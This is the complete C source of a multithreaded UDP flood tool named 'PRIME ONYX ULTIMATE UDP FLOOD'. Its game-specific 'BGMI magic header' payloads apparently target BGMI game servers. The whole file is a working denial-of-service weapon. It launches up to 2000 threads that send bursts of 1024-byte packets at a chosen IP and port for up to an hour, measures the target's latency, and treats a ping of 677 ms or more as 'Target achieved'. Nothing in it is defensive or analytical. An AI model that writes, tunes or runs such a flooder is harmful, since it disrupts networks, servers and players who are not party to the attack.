#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <fcntl.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netdb.h>

// ============================================
// MAXIMUM POWER CONFIGURATION
// ============================================
#define PAYLOAD_COUNT 50
#define PACKET_SIZE 1024
#define BURST_SIZE 100
#define MAX_THREADS 2000

volatile sig_atomic_t stop_attack = 0;

void handle_signal(int sig) {
    stop_attack = 1;
    printf("\n[!] Attack stopped by user\n");
}

void usage() {
    printf("\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║              PRIME ONYX ULTIMATE UDP FLOOD                       ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║ Usage: ./bgmi <IP> <PORT> <TIME> <THREADS>                       ║\n");
    printf("║ Example: ./bgmi 1.1.1.1 80 300 1000                              ║\n");
    printf("║ Max Time: 3600 seconds (1 hour)                                  ║\n");
    printf("║ Max Threads: 2000                                                ║\n");
    printf("╚══════════════════════════════════════════════════════════════════╝\n\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int duration;
    int thread_id;
    unsigned long long packet_count;
    unsigned long long bytes_sent;
};

// Dynamic payloads for maximum variation
unsigned char payloads[PAYLOAD_COUNT][PACKET_SIZE];

// Initialize high-quality random payloads
void init_payloads() {
    srand(time(NULL) ^ (pthread_self() * 12345));
    for (int i = 0; i < PAYLOAD_COUNT; i++) {
        // BGMI magic header
        payloads[i][0] = 0x16;
        payloads[i][1] = 0x9e;
        payloads[i][2] = 0x56;
        payloads[i][3] = 0xc2;
        
        // Randomize payload with high entropy
        for (int j = 4; j < PACKET_SIZE; j++) {
            payloads[i][j] = rand() % 256;
        }
        
        // Add some variation patterns
        if (i % 5 == 0) {
            payloads[i][10] = 0xff;
            payloads[i][20] = 0xaa;
        } else if (i % 5 == 1) {
            payloads[i][15] = 0x55;
            payloads[i][25] = 0xcc;
        } else if (i % 5 == 2) {
            payloads[i][30] = 0x33;
            payloads[i][40] = 0x66;
        }
    }
}

// Advanced ping measurement with multiple attempts
int get_ping_ms(char *ip, int port) {
    int sock;
    struct sockaddr_in addr;
    struct timeval start, end;
    fd_set fds;
    struct timeval timeout;
    char send_buf[32];
    char recv_buf[32];
    int best_ping = 9999;
    
    // Try 3 times and take best
    for (int attempt = 0; attempt < 3; attempt++) {
        if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
            continue;
        }
        
        // Set timeout
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
        
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = inet_addr(ip);
        
        // Craft probe packet
        snprintf(send_buf, sizeof(send_buf), "PING%d", attempt);
        
        gettimeofday(&start, NULL);
        
        if (sendto(sock, send_buf, strlen(send_buf), 0, 
                   (struct sockaddr*)&addr, sizeof(addr)) <= 0) {
            close(sock);
            continue;
        }
        
        FD_ZERO(&fds);
        FD_SET(sock, &fds);
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;
        
        if (select(sock + 1, &fds, NULL, NULL, &timeout) > 0) {
            recvfrom(sock, recv_buf, sizeof(recv_buf), 0, NULL, NULL);
            gettimeofday(&end, NULL);
            long elapsed = (end.tv_sec - start.tv_sec) * 1000 + 
                           (end.tv_usec - start.tv_usec) / 1000;
            if (elapsed > 0 && elapsed < best_ping) {
                best_ping = elapsed;
            }
        }
        close(sock);
        usleep(100000); // 100ms delay between attempts
    }
    
    return (best_ping < 9999) ? best_ping : -1;
}

// Ultra-fast attack thread
void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;
    int payload_index = 0;
    struct timeval tv;
    int i, b;
    
    // Create socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        pthread_exit(NULL);
    }
    
    // Maximum socket optimization
    int val = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val));
    
    // Large buffer for high throughput
    int buffer_size = 8 * 1024 * 1024; // 8MB
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &buffer_size, sizeof(buffer_size));
    
    // Non-blocking for speed
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    
    if (inet_pton(AF_INET, data->ip, &server_addr.sin_addr) <= 0) {
        close(sock);
        pthread_exit(NULL);
    }
    
    endtime = time(NULL) + data->duration;
    data->packet_count = 0;
    data->bytes_sent = 0;
    
    // High-speed attack loop
    while (time(NULL) <= endtime && !stop_attack) {
        // Burst send for maximum throughput
        for (b = 0; b < BURST_SIZE && !stop_attack; b++) {
            for (i = 0; i < PAYLOAD_COUNT; i++) {
                if (sendto(sock, payloads[payload_index], PACKET_SIZE, 0,
                          (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                    // Socket buffer full - continue anyway
                    break;
                }
                data->packet_count++;
                data->bytes_sent += PACKET_SIZE;
                payload_index = (payload_index + 1) % PAYLOAD_COUNT;
            }
        }
        
        // Small yield to prevent CPU lock
        if (data->packet_count % 100000 == 0) {
            usleep(1);
        }
    }
    
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    // Setup signal handlers
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
    
    if (argc != 5) {
        usage();
    }
    
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    
    // Validation
    if (port < 1 || port > 65535) {
        printf("❌ Invalid port! Use 1-65535\n");
        exit(1);
    }
    
    if (duration < 1 || duration > 3600) {
        printf("❌ Invalid duration! Use 1-3600 seconds\n");
        exit(1);
    }
    
    if (threads < 1 || threads > MAX_THREADS) {
        printf("❌ Invalid threads! Use 1-%d\n", MAX_THREADS);
        exit(1);
    }
    
    // Display banner
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║                    PRIME ONYX ULTIMATE FLOOD                     ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║ Target        : %s:%d\n", ip, port);
    printf("║ Duration      : %d seconds (%d minutes)\n", duration, duration/60);
    printf("║ Threads       : %d\n", threads);
    printf("║ Packet Size   : %d bytes\n", PACKET_SIZE);
    printf("║ Payloads      : %d unique patterns\n", PAYLOAD_COUNT);
    printf("║ Burst Mode    : %d packets/cycle\n", BURST_SIZE);
    printf("╚══════════════════════════════════════════════════════════════════╝\n");
    
    // Measure ping
    printf("\n📡 Measuring latency to %s:%d...\n", ip, port);
    int ping_ms = get_ping_ms(ip, port);
    if (ping_ms > 0) {
        printf("✅ Target ping: %d ms\n", ping_ms);
        if (ping_ms >= 677) {
            printf("🎯 Target achieved: %d ms (≥ 677 ms)\n", ping_ms);
        }
    } else {
        printf("⚠️ Could not measure ping (UDP might be filtered)\n");
    }
    
    // Initialize payloads
    printf("\n🔧 Initializing attack payloads...\n");
    init_payloads();
    
    // Allocate thread arrays
    pthread_t thread_ids[threads];
    struct thread_data thread_data_array[threads];
    
    printf("🚀 Launching %d attack threads...\n\n", threads);
    
    // Create threads
    for (int i = 0; i < threads; i++) {
        thread_data_array[i].ip = ip;
        thread_data_array[i].port = port;
        thread_data_array[i].duration = duration;
        thread_data_array[i].thread_id = i + 1;
        thread_data_array[i].packet_count = 0;
        thread_data_array[i].bytes_sent = 0;
        
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&thread_data_array[i]) != 0) {
            printf("❌ Thread %d creation failed\n", i+1);
            exit(1);
        }
    }
    
    printf("✅ All %d threads launched successfully!\n", threads);
    printf("⚡ Attack running for %d seconds... (Press Ctrl+C to stop)\n\n", duration);
    
    // Progress monitoring
    int last_percent = 0;
    for (int elapsed = 30; elapsed <= duration && !stop_attack; elapsed += 30) {
        sleep(30);
        if (!stop_attack) {
            int remaining = duration - elapsed;
            int percent = (elapsed * 100) / duration;
            if (percent != last_percent) {
                last_percent = percent;
                printf("⏳ Progress: %d%% | %d sec elapsed | %d sec remaining (%d min left)\n", 
                       percent, elapsed, remaining, remaining/60);
            }
        }
    }
    
    // Wait for threads to complete
    printf("\n⏳ Waiting for threads to finish...\n");
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }
    
    // Calculate statistics
    unsigned long long total_packets = 0;
    unsigned long long total_bytes = 0;
    for (int i = 0; i < threads; i++) {
        total_packets += thread_data_array[i].packet_count;
        total_bytes += thread_data_array[i].bytes_sent;
    }
    
    double mb_sent = (double)total_bytes / (1024 * 1024);
    double avg_speed_mbps = (mb_sent * 8) / duration;
    double avg_pps = (double)total_packets / duration;
    
    // Final report
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║                     ATTACK COMPLETED                             ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║ Total Packets      : %llu\n", total_packets);
    printf("║ Total Data         : %.2f MB\n", mb_sent);
    printf("║ Average Speed      : %.0f packets/sec\n", avg_pps);
    printf("║ Bandwidth          : %.2f Mbps\n", avg_speed_mbps);
    printf("║ Target Latency     : %d ms\n", ping_ms > 0 ? ping_ms : 0);
    printf("╚══════════════════════════════════════════════════════════════════╝\n");
    
    // Play completion sound (if supported)
    printf("\n🔔 Attack on %s:%d completed!\n", ip, port);
    
    return 0;
}
